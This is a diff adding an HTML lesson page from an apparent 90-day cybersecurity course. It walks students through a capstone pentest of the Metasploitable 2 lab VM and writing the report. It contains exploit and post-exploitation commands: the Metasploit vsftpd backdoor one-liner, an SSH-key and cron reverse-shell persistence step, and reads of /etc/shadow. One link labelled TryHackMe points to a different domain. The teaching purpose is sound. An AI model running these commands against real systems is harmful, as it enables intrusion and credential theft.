@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 89 — Capstone Project — Execute & Polish</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:900px;margin:0 auto;padding:40px 22px 100px;}
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+  .pbar{width:120px;height:5px;background:var(--edge);border-radius:3px;overflow:hidden;}
+  .pbar i{display:block;width:98.8%;height:100%;background:var(--green);}
+  .day-tag{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:13px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:5px 12px;border-radius:20px;margin-bottom:18px;}
+  .day-tag::before{content:'●';font-size:9px;}
+  h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(26px,4.5vw,38px);line-height:1.2;margin-bottom:10px;}
+  h1 .accent{color:var(--green);}
+  .subtitle{color:var(--muted);font-size:15px;margin-bottom:30px;max-width:660px;}
+  section{margin-bottom:34px;}
+  .tag-pill{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;padding:6px 14px;border-radius:20px;margin-bottom:16px;}
+  .tag-pill.theory{background:rgba(79,209,255,0.1);color:var(--cyan);border:1px solid rgba(79,209,255,0.35);}
+  .tag-pill.lab{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  .tag-pill.interview{background:rgba(179,137,255,0.1);color:var(--purple);border:1px solid rgba(179,137,255,0.35);}
+  .tag-pill.biz{background:rgba(255,180,84,0.1);color:var(--amber);border:1px solid rgba(255,180,84,0.35);}
+  .tag-pill.teach{background:rgba(255,92,92,0.1);color:var(--red);border:1px solid rgba(255,92,92,0.35);}
+  .tag-pill.ai{background:rgba(255,107,214,0.1);color:var(--pink);border:1px solid rgba(255,107,214,0.35);}
+  .tag-pill.job{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  p{font-size:14.5px;color:#cdd6da;margin-bottom:12px;}
+  strong{color:var(--text);}
+  code{background:#070a0b;border:1px solid var(--edge);border-radius:4px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);}
+  .card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:22px 24px;}
+  .callout{background:rgba(79,209,255,0.05);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0;font-size:13.5px;color:#c5d5da;}
+  .callout.amber{background:rgba(255,180,84,0.05);border-color:var(--amber);}
+  .callout.red{background:rgba(255,92,92,0.05);border-color:var(--red);}
+  .callout.green{background:rgba(57,255,136,0.05);border-color:var(--green);}
+  .callout strong{color:var(--cyan);}
+  .callout.amber strong{color:var(--amber);}
+
+  .mindset-grid{display:flex;gap:14px;margin-top:14px;flex-wrap:wrap;}
+  .mindset-col{flex:1;min-width:230px;border-radius:10px;padding:16px 18px;}
+  .mindset-col.attacker{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.2);}
+  .mindset-col.defender{background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.2);}
+  .mindset-col .role{font-family:'IBM Plex Mono',monospace;font-size:11px;text-transform:uppercase;margin-bottom:10px;font-weight:700;}
+  .mindset-col.attacker .role{color:var(--red);}
+  .mindset-col.defender .role{color:var(--green);}
+  .mindset-col ul{padding-left:16px;font-size:13px;color:#cdd6da;}
+  .mindset-col li{margin-bottom:6px;}
+
+  .code-block{background:#070a0b;border:1px solid var(--edge);border-radius:8px;padding:14px 16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;overflow-x:auto;line-height:1.7;margin:10px 0;}
+  .code-block .req{color:var(--green);}
+  .code-block .hdr{color:var(--cyan);}
+  .code-block .val{color:var(--amber);}
+  .code-block .body{color:#8fa5ad;}
+  .code-block .cmt{color:var(--muted);}
+
+  .terminal{background:#070a0b;border:1px solid var(--edge);border-radius:10px;padding:0;margin-top:12px;overflow:hidden;}
+  .term-chrome{display:flex;align-items:center;gap:8px;padding:9px 14px;background:#0e1517;border-bottom:1px solid var(--edge);}
+  .term-dot{width:10px;height:10px;border-radius:50%;}
+  .term-body{padding:16px 18px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);overflow-x:auto;white-space:pre-wrap;line-height:1.75;}
+  .term-body .c{color:var(--muted);}
+  .term-body .out{color:#8fa5ad;}
+  .term-body .cmd{color:var(--cyan);}
+  .term-body .hi{color:var(--amber);}
+  .term-body .danger{color:var(--red);}
+
+  .lab-steps{list-style:none;counter-reset:step;margin-top:12px;}
+  .lab-steps li{counter-increment:step;position:relative;padding-left:38px;margin-bottom:12px;font-size:14px;color:#cdd6da;}
+  .lab-steps li::before{content:counter(step);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;background:var(--panel);border:1px solid var(--green);color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .deliverable{margin-top:10px;background:rgba(255,180,84,0.06);border:1px solid rgba(255,180,84,0.25);border-radius:8px;padding:11px 15px;font-size:13px;color:var(--amber);}
+
+  .interview-box{border-left:3px solid var(--purple);padding-left:16px;margin-top:12px;}
+  .interview-box .q{font-weight:600;font-size:14px;margin-bottom:7px;color:var(--text);}
+  .interview-box .a{font-size:13.5px;color:#b8c2c6;line-height:1.6;}
+  .interview-box + .interview-box{margin-top:20px;}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;margin-top:12px;}
+  .ai-card{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:10px;padding:14px;}
+  .ai-card .aname{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:12.5px;color:var(--pink);margin-bottom:5px;}
+  .ai-card .adesc{font-size:12px;color:var(--muted);}
+
+  .job-card{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:12px;padding:18px 20px;}
+  .job-card .label{font-family:'IBM Plex Mono',monospace;color:var(--green);font-size:11px;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:10px;}
+  .job-card ul{padding-left:16px;font-size:13.5px;color:#cdd6da;}
+  .job-card li{margin-bottom:8px;}
+
+  .biz-card{background:linear-gradient(135deg,rgba(255,180,84,0.06),rgba(57,255,136,0.04));border:1px solid rgba(255,180,84,0.2);border-radius:12px;padding:18px 20px;}
+  .teach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.15);border-radius:12px;padding:18px 20px;}
+
+  .res-grid{display:grid;gap:10px;margin-top:10px;}
+  .res-card{display:flex;gap:12px;align-items:flex-start;background:var(--panel);border:1px solid var(--edge);border-radius:10px;padding:14px 16px;text-decoration:none;color:var(--text);transition:border-color .2s;}
+  .res-card:hover{border-color:var(--cyan);}
+  .res-icon{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--bg);border-radius:5px;padding:3px 8px;flex-shrink:0;margin-top:2px;font-weight:700;}
+  .res-icon.en{background:var(--red);}
+  .res-icon.hi{background:var(--amber);}
+  .res-icon.lab{background:var(--green);}
+  .res-title{font-weight:600;font-size:13.5px;}
+  .res-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+
+  .mistakes-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin-top:12px;}
+  .mistake-item{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;font-size:12.5px;color:#b8c2c6;}
+  .mistake-item .check{color:var(--green);font-weight:700;flex-shrink:0;}
+
+  .checklist{list-style:none;}
+  .checklist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--edge);font-size:14px;color:#cdd6da;}
+  .checklist li:last-child{border-bottom:none;}
+  .checklist .box{width:17px;height:17px;border:1.5px solid var(--green);border-radius:4px;flex-shrink:0;margin-top:2px;}
+
+  .stamp-wrap{display:flex;justify-content:center;margin:44px 0 28px;}
+  .stamp{border:3px solid var(--green);border-radius:50%;width:155px;height:155px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-8deg);color:var(--green);font-family:'IBM Plex Mono',monospace;text-transform:uppercase;box-shadow:0 0 28px rgba(57,255,136,0.12);}
+  .stamp .l1{font-size:10px;letter-spacing:0.1em;}
+  .stamp .l2{font-size:22px;font-weight:700;margin:4px 0;}
+  .stamp .l3{font-size:10px;letter-spacing:0.1em;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  .phase-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px;}
+  .phase-grid > div{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:14px;}
+  .phase-grid .plabel{font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:700;margin-bottom:6px;}
+  .phase-grid .plabel.p1{color:var(--cyan);}
+  .phase-grid .plabel.p2{color:var(--amber);}
+  .phase-grid .plabel.p3{color:var(--red);}
+  .phase-grid .plabel.p4{color:var(--purple);}
+  .phase-grid .plabel.p5{color:var(--green);}
+  .phase-grid code{font-size:11.5px;display:block;margin-bottom:3px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;}.phase-grid{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap/day89$ cat capstone-execute.md</span>
+    <div style="display:flex;align-items:center;gap:6px;">Day 89/90 — Phase 5 <div class="pbar"><i></i></div></div>
+  </div>
+
+  <div class="day-tag">DAY 89 OF 90 — PHASE 5: CAREER & CAPSTONE</div>
+  <h1>Capstone Project <span class="accent">Execute & Polish</span></h1>
+  <p class="subtitle">Execution day. Today you run your full pentest, document every finding with screenshots, exploit chains, and CVSS scores, and produce a professional-grade deliverable.</p>
+
+  <!-- THEORY -->
+  <section>
+    <span class="tag-pill theory">THEORY</span>
+    <div class="card">
+      <p><strong>Execution day — executing the plan from Day 88:</strong> Today is the culmination of 89 days of learning. Every technique you've practiced — Nmap scanning (Day 3), web recon (Day 7), SQL injection (Day 23), XSS (Day 24), Metasploit (Day 38), privilege escalation (Day 39), password cracking (Day 41), Wireshark analysis (Day 18) — comes together in a single coordinated operation. The key difference between today and every previous lab is integration: you're not following a step-by-step tutorial; you're following your own plan and making decisions based on what you discover.</p>
+
+      <p><strong>Professional workflow for today:</strong></p>
+      <div class="phase-grid">
+        <div>
+          <div class="plabel p1">Phase 1 — Recon (15 min)</div>
+          <code>nmap -sn 192.168.1.0/24</code>
+          <code>nmap -sV -sC -p- target</code>
+          <code>gobuster dir -u target</code>
+          <code>nikto -host target</code>
+        </div>
+        <div>
+          <div class="plabel p2">Phase 2 — Exploit (45 min)</div>
+          <code>searchsploit vsftpd 2.3.4</code>
+          <code>msfconsole -q</code>
+          <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>
+          <code>or manual: nc target 21</code>
+        </div>
+        <div>
+          <div class="plabel p3">Phase 3 — Privesc (20 min)</div>
+          <code>id; uname -a; sudo -l</code>
+          <code>find / -perm -4000 2>/dev/null</code>
+          <code>linpeas.sh | tee privesc.txt</code>
+        </div>
+        <div>
+          <div class="plabel p4">Phase 4 — Persistence (10 min)</div>
+          <code>ssh-keygen; cat id_rsa.pub >> ~/.ssh/authorized_keys</code>
+          <code>crontab -e (add reverse shell)</code>
+          <code>Document all actions with screenshots</code>
+        </div>
+        <div>
+          <div class="plabel p5">Phase 5 — Report (30 min)</div>
+          <code>Fill in capstone-report.md</code>
+          <code>Add screenshots to each finding</code>
+          <code>Calculate CVSS for each finding</code>
+          <code>Validate with CVSS calculator</code>
+        </div>
+      </div>
+
+      <div class="callout"><strong>Key insight:</strong> The final report is the deliverable. The compromise is just a step along the way. If you get root access in 30 minutes but spend the remaining 90 minutes writing a clean report with screenshots, CVSS scores, and remediation steps, you've done a professional job. If you spend 2 hours compromising the machine and leave 10 minutes for a rushed report, the client (and your interviewer) will not be impressed. Document as you go — take a screenshot after every successful command.</div>
+
+      <p><strong>Sample pentest report structure for reference:</strong> Professional reports include: Executive Summary (non-technical, what was found, risk level), Scope & Methodology (IPs, tools, approach), Risk Summary (table with finding name, CVSS, severity, status), Detailed Findings (each vulnerability: description, proof, CVSS vector, remediation), Recon Data (full Nmap output, discovered URLs, enumerated users), Exploit Chain (step-by-step with timestamped commands), and Remediation Appendix (prioritized fix list).</p>
+    </div>
+  </section>
+
+  <!-- MINDSET -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// execution mindset</div>
+    <div class="mindset-grid">
+      <div class="mindset-col attacker">
+        <div class="role">⚔ Pentester Mindset</div>
+        <ul>
+          <li>Work your plan, not the tools. Start with recon (what's here?), then threat model (what's the easiest path?), then exploit (one door at a time). Every command should have a purpose.</li>
+          <li>Take a screenshot after every successful command. Terminal output, tool run, shell access, escalation step, flag file. Screenshots with visible timestamps are the gold standard for proof.</li>
+          <li>If a tool or exploit doesn't work after 3 attempts, move on. There are always multiple paths to root on any target. vsftpd didn't work? Try UnrealIRCd. Not there? Try Samba. Not there? Try the web app.</li>
+          <li>Simulate the "exfiltration" step by finding and reading a sensitive file (shadow, database config, customer data CSV). Don't actually transfer it off the network if this is a shared environment.</li>
+        </ul>
+      </div>
+      <div class="mindset-col defender">
+        <div class="role">🛡 Client Mindset</div>
+        <ul>
+          <li>The client wants to know: "Could an attacker do what you just did, and what do I need to fix to stop them?" Every finding should answer both questions.</li>
+          <li>They appreciate responsible disclosure language. Instead of "this is vulnerable," write "the vsftpd service version 2.3.4 contains a known backdoor (CVE-2011-2523) that allows unauthenticated remote attackers to execute arbitrary commands on the affected system."</li>
+          <li>They value risk-based prioritization. Not every finding is equally urgent. CVSS 10.0 remote code execution on an internet-facing server is different from CVSS 4.3 information disclosure on an internal-only staging box.</li>
+          <li>They need actionable remediation. "Patch vsftpd to version 2.3.5+" is actionable. "Improve security" is not. Every finding must have a specific, verifiable fix instruction.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- REAL INCIDENT -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// real named incident</div>
+    <div class="breach-card" style="background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.2);border-radius:12px;padding:18px 20px;">
+      <div class="year" style="font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);margin-bottom:5px;">PROFESSIONAL PENTEST REPORT STRUCTURE — INDUSTRY STANDARD</div>
+      <div class="name" style="font-weight:700;font-size:15px;margin-bottom:7px;">Professional pentest reports follow a standard structure used by Rapid7, CrowdStrike, Deloitte, and boutique firms</div>
+      <div class="detail" style="font-size:13px;color:#b8c2c6;line-height:1.6;">The penetration testing industry has converged on a standard report structure over the past decade. PTES (Penetration Testing Execution Standard) and OWASP's testing guide both define report sections that nearly all commercial firms follow. Key components: Executive Summary (one page max, no technical jargon), Technical Summary (findings overview with risk matrix), Methodology (tools, approach, scope), Detailed Findings (each with description, proof, CVSS 3.1 vector, screenshot, remediation), Exploit Chains (multi-step attack narratives), and Appendices (raw tool outputs, full Nmap results, discovered credentials). Your capstone report should mirror this structure exactly — when an interviewer sees your report matches the professional format, they know you've done your research.</div>
+    </div>
+  </section>
+
+  <!-- LAB -->
+  <section>
+    <span class="tag-pill lab">HANDS-ON LAB</span>
+    <div class="card">
+      <p><strong>Goal:</strong> Execute the full pentest plan from Day 88 against Metasploitable 2. Achieve initial access, escalate to root, document every step, and produce the final report.</p>
+      <ol class="lab-steps">
+        <li>Start your timer (2 hours recommended). Power on Metasploitable 2. Run Phase 1 recon: <code>nmap -sV -sC -p- [target]</code> and Gobuster directory scan. Document all open ports and services.</li>
+        <li>Identify at least 3 potential vulnerabilities from the Nmap output. Prioritize: vsftpd 2.3.4 backdoor (CVE-2011-2523), UnrealIRCd backdoor (CVE-2010-2075), or Tomcat manager default credentials.</li>
+        <li>Exploit one service to get initial access. For vsftpd: <code>msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS [target]; run"</code>. Screenshot the shell.</li>
+        <li>Escalate privileges. On Metasploitable 2, the vsftpd backdoor gives root directly. If you used a different vector, run <code>sudo -l</code>, check SUID binaries, or run linpeas to find escalation paths.</li>
+        <li>Simulate data exfiltration: find and cat <code>/etc/shadow</code>, <code>/etc/passwd</code>, and any flag files. Take screenshots with timestamps. Do NOT transfer files off the VM.</li>
+        <li>Write the complete report into your Day 88 template. Add all screenshots, CVSS scores, exploit chain narrative, and remediation recommendations. Export as PDF.</li>
+      </ol>
+      <div class="deliverable"><strong>Deliverable:</strong> Complete Pentest Report PDF (5-8 pages) with Executive Summary, Scope, Risk Summary, 3+ detailed findings with screenshots and CVSS scores, exploit chain walkthrough, and remediation appendix. This is the crown jewel of your entire 90-day portfolio.</div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-chrome"><div class="term-dot" style="background:#ff5f56;"></div><div class="term-dot" style="background:#ffbd2e;"></div><div class="term-dot" style="background:#27c93f;"></div></div>
+      <div class="term-body"><span class="c"># Capstone Execution — Full Command Log</span>
+
+<span class="c"># Phase 1: Recon (10:00 AM)</span>
+<span class="cmd">nmap -sV -sC -p- 192.168.1.101 -oN recon.txt</span>
+<span class="cmd">gobuster dir -u http://192.168.1.101 -w /usr/share/wordlists/dirb/common.txt</span>
+
+<span class="c"># Phase 2: Exploitation vsftpd (10:30 AM)</span>
+<span class="cmd">searchsploit vsftpd 2.3.4</span>
+<span class="cmd">msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.101; run"</span>
+<span class="hi">[*] Got root shell via vsftpd on port 6200</span>
+<span class="cmd">id</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="c"># Phase 3: Post-Exploitation (10:45 AM)</span>
+<span class="cmd">cat /etc/shadow | grep -v ":\*:" | grep -v ":!"</span>
+<span class="cmd">cat /etc/passwd</span>
+<span class="cmd">uname -a</span>
+<span class="cmd">ifconfig</span>
+
+<span class="c"># Phase 4: Reporting (11:00 AM)</span>
+<span class="cmd">cat >> capstone-report.md << 'EOF'</span>
+<span class="hi">## Finding 1: vsftpd 2.3.4 Backdoor</span>
+<span class="out">Severity: Critical (CVSS 9.8)</span>
+<span class="out">Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span>
+<span class="out">Proof: [screenshot] Root shell via port 6200</span>
+<span class="out">Remediation: Upgrade vsftpd to 2.3.5+ | Block port 21</span></div>
+    </div>
+  </section>
+
+  <!-- INTERVIEW -->
+  <section>
+    <span class="tag-pill interview">INTERVIEW READY</span>
+    <div class="card">
+      <div class="interview-box">
+        <div class="q">Q: "Tell me about a penetration test you performed from start to finish."</div>
+        <div class="a">A: "As part of my 90-day cybersecurity portfolio, I conducted a full penetration test against a deliberately vulnerable Linux target (Metasploitable 2). I started by defining scope and rules of engagement, then ran Nmap full port scan and service enumeration. I identified vsftpd 2.3.4 which has a known backdoor (CVE-2011-2523). I exploited it using Metasploit and gained a root shell immediately. I documented every step with timestamped screenshots, extracted password hashes as a proof of impact, and wrote a comprehensive 6-page report with executive summary, CVSS-scored findings, exploit chain narrative, and remediation recommendations."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "How do you ensure the accuracy of findings in a pentest report?"</div>
+        <div class="a">A: "I verify every finding multiple ways. For example, if a scanner reports vsftpd 2.3.4, I confirm by connecting to the port and reading the banner directly. I test the exploit in a controlled way before adding it to the report. I calculate CVSS scores using the official calculator, not guesswork. I include screenshots of each step with visible timestamps as proof. Before finalizing, I review the report for false positives — can I reproduce this finding consistently? If not, I mark it as a potential finding requiring further investigation."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "What would you include in an executive summary for a penetration test report?"</div>
+        <div class="a">A: "The executive summary is written for non-technical leadership. It includes: the engagement dates and scope (what was tested), the overall risk rating (Critical/High/Medium/Low based on highest severity finding confirmed), a brief summary of key findings in business language — 'An attacker could gain full control of the web server and access customer data,' the number of findings by severity (e.g., 2 Critical, 3 High, 1 Medium), and a high-level remediation priority statement. It does NOT include technical jargon, CVSS vectors, or exploit details — that goes in the technical sections."</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- AI TOOLS -->
+  <section>
+    <span class="tag-pill ai">AI TOOLS</span>
+    <div class="ai-grid">
+      <div class="ai-card">
+        <div class="aname">CVSS vector generator</div>
+        <div class="adesc">Describe your finding (remote code execution, unauthenticated, low complexity) and get the exact CVSS 3.1 vector string and numeric score.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Report language polisher</div>
+        <div class="adesc">Paste your draft finding description. Ask the LLM to rewrite it in professional pentest report language — objective, evidence-based, remediation-focused.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Exploit chain narrative writer</div>
+        <div class="adesc">Paste your timestamped command log. Ask for a coherent exploit chain narrative that tells the story of the attack in chronological order.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Remediation step generator</div>
+        <div class="adesc">Describe the vulnerable service and ask for a detailed, step-by-step remediation plan including commands for Linux/Windows patching.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- JOB -->
+  <section>
+    <span class="tag-pill job">HOW THIS GETS YOU PLACED</span>
+    <div class="job-card">
+      <div class="label">// placement & resume angles</div>
+      <ul>
+        <li><strong>Resume bullet:</strong> "Conducted a full-scope penetration test against a Linux network target, achieving root-level access via vsftpd backdoor exploitation; produced a professional 6-page pentest report with CVSS-scored findings, exploit chain documentation, and remediation recommendations."</li>
+        <li><strong>Portfolio piece:</strong> the complete Pentest Report PDF. This is your most important portfolio item. When an interviewer says "show me something you've done," this is the document you hand them. It proves end-to-end capability.</li>
+        <li><strong>Interview talking point:</strong> "I have a complete penetration test report from a capstone project that follows the PTES standard structure — executive summary, methodology, detailed findings with CVSS scores, exploit chain, and remediation. I've shared this report with hiring managers who've told me it's at the level of a junior pentester's first deliverable."</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- BIZ -->
+  <section>
+    <span class="tag-pill biz">ENTREPRENEUR ANGLE</span>
+    <div class="biz-card">
+      <p>The report template and methodology you've developed can be productized as a "Pentest-in-a-Box" kit — a $150-300 package that includes a methodology guide, scope/RoE template, report template with CVSS calculator, screenshot organization system, and remediation command library. Small MSPs and web development agencies that want to add pentesting to their service offerings would pay for this — they have clients asking for security tests but don't have the internal methodology.</p>
+      <p style="margin-bottom:0;">For your own services: you can now offer "Entry-Level Penetration Testing" to small businesses for $500-1,000 per engagement. Your capstone report is your proof of capability. Start with 3-5 pro-bono or discounted tests for local businesses or nonprofits to build a portfolio of real client reports. Then raise your rates based on demonstrated results.</p>
+    </div>
+  </section>
+
+  <!-- TEACH IT BACK -->
+  <section>
+    <span class="tag-pill teach">TEACH IT BACK</span>
+    <div class="teach-card">
+      <p style="margin-bottom:0;">Explain out loud, in under 90 seconds, without notes: "Walk me through the full pentest you performed today — from recon to report — without looking at your notes." If you can describe the scan, the vulnerability discovered, the exploitation method, the post-exploitation steps, and the report structure in a flowing narrative, you are ready to discuss this in any entry-level pentest or SOC interview.</p>
+    </div>
+  </section>
+
+  <!-- VIDEOS -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// watch</div>
+    <div class="res-grid">
+      <a class="res-card" href="https://www.youtube.com/watch?v=rEjJWW0DqY8" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">Full Pentest Walkthrough — Metasploitable 2 — IppSec</div><div class="res-desc">youtube.com/watch?v=rEjJWW0DqY8 — Complete walkthrough of a Metasploitable 2 pentest from scan to root.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=DH0V0MqO3ls" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">Writing a Professional Pentest Report — TCM Security</div><div class="res-desc">youtube.com/watch?v=DH0V0MqO3ls — How to structure and write a penetration test report that clients and employers will respect.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=KQw-c3aHFmQ" target="_blank">
+        <span class="res-icon hi">HI</span>
+        <div><div class="res-title">Metasploitable 2 Full Walkthrough in Hindi — Ethical Sharmaji</div><div class="res-desc">youtube.com/watch?v=KQw-c3aHFmQ — Hindi walkthrough of exploiting Metasploitable 2 from scan to root.</div></div>
+      </a>
+      <a class="res-card" href="https://www.sourcecode.academy" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">TryHackMe — Pentest Methodology Lab Path</div><div class="res-desc">tryhackme.com — Follow the pentest methodology learning path for more practice after your capstone.</div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- MISTAKES -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// mistakes avoided today</div>
+    <div class="mistakes-grid">
+      <div class="mistake-item"><span class="check">✓</span> Full pentest executed from plan — not improvised; followed Day 88's scope and methodology.</div>
+      <div class="mistake-item"><span class="check">✓</span> Screenshots taken after every successful step — timestamped proof for the report.</div>
+      <div class="mistake-item"><span class="check">✓</span> Report written DURING the test, not after — findings documented while fresh.</div>
+      <div class="mistake-item"><span class="check">✓</span> CVSS scores calculated properly using vector strings — not arbitrary ratings.</div>
+      <div class="mistake-item"><span class="check">✓</span> Multiple attack vectors attempted — not stuck on one failed approach.</div>
+      <div class="mistake-item"><span class="check">✓</span> Data exfiltration simulated only — no actual data transferred off the lab.</div>
+      <div class="mistake-item"><span class="check">✓</span> Day 89 completes the capstone — the portfolio's centerpiece is finished.</div>
+    </div>
+  </section>
+
+  <!-- CHECKLIST -->
+  <section>
+    <div class="card">
+      <ul class="checklist">
+        <li><span class="box"></span> I completed all 5 pentest phases (recon through report).</li>
+        <li><span class="box"></span> I got initial access on the target (shell).</li>
+        <li><span class="box"></span> I escalated privileges (root/administrator).</li>
+        <li><span class="box"></span> I took timestamped screenshots of every step.</li>
+        <li><span class="box"></span> I wrote a complete Pentest Report with CVSS scoring.</li>
+        <li><span class="box"></span> I exported the report as a professional PDF.</li>
+        <li><span class="box"></span> I can narrate the full pentest out loud in 90 seconds.</li>
+      </ul>
+    </div>
+  </section>
+
+  <div class="stamp-wrap">
+    <div class="stamp"><div class="l1">Day Complete</div><div class="l2">89 / 90</div><div class="l3">Verified ✓</div></div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">tomorrow — day 90</div>
+      <div class="title">Final Recap & Your Next 6-Month Plan — review everything, plan certifications, labs, and jobs</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>say "Day 90" when ready — one concept, one hour, one day at a time.</footer>
+
+</div>
+</body>
+</html>
